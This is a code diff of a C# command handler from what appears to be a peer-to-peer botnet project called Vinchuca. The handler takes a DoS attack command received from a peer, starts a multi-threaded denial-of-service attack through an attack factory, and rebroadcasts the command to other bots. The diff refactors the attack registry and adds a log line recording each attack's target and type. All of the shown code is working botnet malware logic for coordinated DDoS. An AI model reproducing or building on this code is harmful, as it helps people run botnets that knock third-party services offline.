@@ -1,19 +1,19 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.Net.Configuration;
 using Vinchuca.Actions.DDoS;
 using Vinchuca.Network.Protocol.Messages;
 using Vinchuca.Network.Protocol.Messages.Command;
 using Vinchuca.Network.Protocol.Peers;
-using Vinchuca.Actions.DDoS;
 
 namespace Vinchuca.Network.Protocol.Handlers.Command
 {
     class DosAttackHandler : IMessageHandler
     {
-        private static readonly Dictionary<long, Attacker> Attackers = new Dictionary<long, Attacker>();
-
         private readonly PeerList _peerList;
         private readonly MessageManager _messageManager;
+
         public DosAttackHandler(PeerList peerList, MessageManager messageManager)
         {
             _peerList = peerList;
@@ -23,7 +23,7 @@ namespace Vinchuca.Network.Protocol.Handlers.Command
         public void Handle(BotMessage botMessage)
         {
             var msg = botMessage.Message as DosAttackMessage;
-            if (Attackers.ContainsKey(msg.AttackId))
+            if (Attacker.Attackers.ContainsKey(msg.AttackId))
             {
                 return;
             }
@@ -31,7 +31,8 @@ namespace Vinchuca.Network.Protocol.Handlers.Command
             var attack = AttackFactory.Create(msg);
             var attacker = new Attacker(msg.Threads, attack);
             attacker.Start();
-            Attackers.Add(msg.AttackId, attacker);
+            Attacker.Logger.Info("Attacking ({2}) session {0} targeting {1} ", msg.AttackId, msg.Target, Enum.GetName(typeof(DosAttackMessage.DosType), msg.Type));
+            Attacker.Attackers.Add(msg.AttackId, attacker);
 
             _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
         }
